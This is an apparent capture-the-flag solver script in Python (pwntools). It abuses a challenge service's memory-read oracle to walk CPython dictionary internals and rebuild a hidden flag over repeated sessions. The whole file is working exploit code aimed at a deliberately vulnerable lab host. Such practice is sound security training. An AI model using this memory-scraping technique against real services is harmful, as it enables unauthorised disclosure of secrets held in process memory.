from pwn import *
import re
import time
import json

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

def single_scan_session_with_indices():
    """Run one scanning session and return found characters WITH their original indices"""
    try:
        context.log_level = 'error'  # Reduce noise
        io = remote(HOST, PORT, ssl=True)
        
        # Get dict address
        intro = io.recvline_contains(b'flag is over at').decode()
        banner2 = io.recvline().decode()
        
        m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
        if not m:
            io.close()
            return {}, {}
            
        dict_obj_addr = int(m.group(1), 16)
        
        def read_memory(addr):
            addr_str = f"{addr:x}"
            io.sendline(addr_str.encode())
            line = io.recvline(timeout=2).decode().strip()
            
            if 'illegal memory address' in line:
                return None
                
            parts = line.split(': ')
            if len(parts) >= 2:
                hex_data = parts[-1].strip()
                try:
                    return bytes.fromhex(hex_data)
                except:
                    return None
            return None
        
        # Get ma_keys pointer
        ma_keys_data = read_memory(dict_obj_addr + 0x20)
        if not ma_keys_data:
            io.close()
            return {}, {}
            
        ma_keys_ptr = u64(ma_keys_data)
        
        flag_mapping = {}  # index -> character mapping
        reads_used = 1
        max_reads = 45
        
        print(f"    Scanning ma_keys at {ma_keys_ptr:#x}")
        
        # Try to find the actual dict entries (PyDictKeyEntry structures)
        # Each entry has: hash(8) + key_ptr(8) + value_ptr(8) = 24 bytes
        
        # Scan for dict entries more systematically
        for offset in range(0x50, 0x600, 8):  # Scan larger range
            if reads_used >= max_reads - 10:
                break
                
            scan_addr = ma_keys_ptr + offset
            data = read_memory(scan_addr)
            reads_used += 1
            
            if data:
                ptr_val = u64(data)
                
                # Look for heap pointers that could be key or value objects
                if 0x400000 < ptr_val < 0x800000000000 and reads_used < max_reads - 8:
                    
                    # This might be part of a PyDictKeyEntry
                    # Try to read what could be the next field (key or value)
                    next_data = read_memory(scan_addr + 8)
                    reads_used += 1
                    
                    if next_data:
                        next_ptr = u64(next_data)
                        
                        # If we have two consecutive pointers, this might be key+value pair
                        if 0x400000 < next_ptr < 0x800000000000:
                            
                            # Try to read both as potential key and value objects
                            key_obj = None
                            value_obj = None
                            
                            # Read potential key object (should be small integer)
                            if reads_used < max_reads - 6:
                                key_data = read_memory(ptr_val + 0x18)  # Try int object data offset
                                reads_used += 1
                                if not key_data:
                                    key_data = read_memory(ptr_val + 0x20)  # Alternative offset
                                    reads_used += 1
                                
                                if key_data:
                                    # Try to extract small integer value (0-50 range for flag indices)
                                    for i in range(0, 8, 4):  # Try 32-bit and 64-bit interpretations
                                        if i + 4 <= len(key_data):
                                            val32 = int.from_bytes(key_data[i:i+4], 'little')
                                            if 0 <= val32 <= 100:  # Reasonable flag index
                                                key_obj = val32
                                                break
                                        if i + 8 <= len(key_data):
                                            val64 = int.from_bytes(key_data[i:i+8], 'little') 
                                            if 0 <= val64 <= 100:
                                                key_obj = val64
                                                break
                            
                            # Read potential value object (should be single character)
                            if reads_used < max_reads - 4:
                                for str_offset in [0x28, 0x30, 0x38, 0x20]:  # Try common string offsets
                                    if reads_used >= max_reads - 3:
                                        break
                                        
                                    value_data = read_memory(next_ptr + str_offset)
                                    reads_used += 1
                                    
                                    if value_data:
                                        # Look for single character
                                        for b in value_data:
                                            if 32 <= b <= 126:
                                                char = chr(b)
                                                if (char.isalnum() or char in '{}_.,-!@#$%^&*()[]|\\:;"<>?/~`'):
                                                    value_obj = char
                                                    break
                                            elif b == 0:
                                                break
                                        if value_obj:
                                            break
                            
                            # If we found both a reasonable index and character, store the mapping
                            if key_obj is not None and value_obj is not None:
                                flag_mapping[key_obj] = value_obj
                                print(f"      Found mapping: {key_obj} -> '{value_obj}'")
        
        io.close()
        return flag_mapping, {'reads_used': reads_used, 'ma_keys': ma_keys_ptr}
        
    except Exception as e:
        try:
            io.close()
        except:
            pass
        return {}, {'error': str(e)}

def aggregate_flag_mappings(num_sessions=8):
    """Run multiple sessions to build complete flag mapping"""
    
    print(f"=== MULTI-SESSION FLAG INDEX MAPPING ===")
    print(f"Running {num_sessions} sessions to map indices to characters...")
    
    complete_mapping = {}  # index -> character
    all_sessions = []
    
    for session_num in range(num_sessions):
        print(f"\nSession {session_num + 1}/{num_sessions}:")
        
        session_mapping, metadata = single_scan_session_with_indices()
        
        if session_mapping:
            new_mappings = 0
            for index, char in session_mapping.items():
                if index not in complete_mapping:
                    complete_mapping[index] = char
                    new_mappings += 1
                elif complete_mapping[index] != char:
                    print(f"    Conflict at index {index}: '{complete_mapping[index]}' vs '{char}'")
            
            print(f"  Found: {len(session_mapping)} mappings")
            print(f"  New: {new_mappings} mappings") 
            if session_mapping:
                sorted_items = sorted(session_mapping.items())
                print(f"  Mappings: {sorted_items}")
            
            all_sessions.append({
                'session': session_num + 1,
                'mappings': session_mapping,
                'metadata': metadata
            })
        else:
            error = metadata.get('error', 'Unknown error')
            print(f"  Failed: {error}")
        
        time.sleep(0.5)
    
    return complete_mapping, all_sessions

# Run the index-aware aggregation
if __name__ == "__main__":
    flag_mapping, sessions = aggregate_flag_mappings(10)  # Try 10 sessions
    
    print(f"\n" + "="*60)
    print(f"FLAG RECONSTRUCTION RESULTS")
    print(f"="*60)
    
    if flag_mapping:
        print(f"\nComplete flag mapping found:")
        max_index = max(flag_mapping.keys()) if flag_mapping else 0
        
        # Sort by index to show the mappings in order
        sorted_mappings = sorted(flag_mapping.items())
        print(f"\nIndex -> Character mappings:")
        for index, char in sorted_mappings:
            print(f"  {index:2d} -> '{char}'")
        
        # Reconstruct the flag in correct order
        flag_chars = []
        missing_indices = []
        
        for i in range(max_index + 1):
            if i in flag_mapping:
                flag_chars.append(flag_mapping[i])
            else:
                flag_chars.append('?')
                missing_indices.append(i)
        
        reconstructed_flag = ''.join(flag_chars)
        print(f"\nReconstructed flag: {reconstructed_flag}")
        
        if missing_indices:
            print(f"Missing indices: {missing_indices}")
            print(f"Completion: {len(flag_mapping)}/{max_index + 1} characters ({100 * len(flag_mapping) / (max_index + 1):.1f}%)")
        else:
            print(f"🎉 COMPLETE FLAG FOUND: {reconstructed_flag}")
        
        # Also show compact version (remove missing chars)
        clean_flag = ''.join(flag_mapping[i] for i in sorted(flag_mapping.keys()))
        print(f"Clean version: {clean_flag}")
        
    else:
        print("No flag mappings found. The dict entries might be in a different location.")
        print("Consider adjusting the scanning offsets or trying manual exploration.")
    
    # Save results
    results = {
        'flag_mapping': flag_mapping,
        'reconstructed_flag': ''.join(flag_mapping.get(i, '?') for i in range(max(flag_mapping.keys()) + 1)) if flag_mapping else '',
        'clean_flag': ''.join(flag_mapping[i] for i in sorted(flag_mapping.keys())) if flag_mapping else '',
        'completion_stats': {
            'found_indices': len(flag_mapping),
            'max_index': max(flag_mapping.keys()) if flag_mapping else 0,
            'missing_indices': [i for i in range(max(flag_mapping.keys()) + 1) if i not in flag_mapping] if flag_mapping else []
        },
        'sessions': sessions
    }
    
    with open('flag_index_mapping.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\nResults saved to: flag_index_mapping.json")
    
    # Final recommendations
    if flag_mapping:
        missing_count = len([i for i in range(max(flag_mapping.keys()) + 1) if i not in flag_mapping])
        if missing_count > 0:
            print(f"\nNext steps:")
            print(f"- Run more sessions to find {missing_count} missing characters")
            print(f"- Or try manual exploration for specific indices")
        else:
            print(f"\n🏁 FLAG COMPLETE AND READY TO SUBMIT!")
    else:
        print(f"\nNo mappings found - may need to adjust dict entry parsing approach")